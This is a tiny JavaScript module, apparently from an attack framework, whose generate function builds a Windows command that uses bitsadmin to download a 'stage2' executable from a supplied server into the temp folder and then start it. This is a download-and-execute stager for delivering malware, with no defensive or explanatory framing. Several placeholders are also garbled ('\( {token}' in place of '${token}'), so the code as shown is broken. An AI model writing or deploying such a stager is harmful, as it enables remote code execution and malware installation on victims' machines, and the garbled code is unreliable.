function generate(token, serverUrl) {
    return `bitsadmin /transfer h\( {token} /download /priority normal " \){serverUrl}/stage2?token=\( {token}" %TEMP%\\h_ \){token}.exe && start %TEMP%\\h_${token}.exe`;
}

module.exports = { generate };
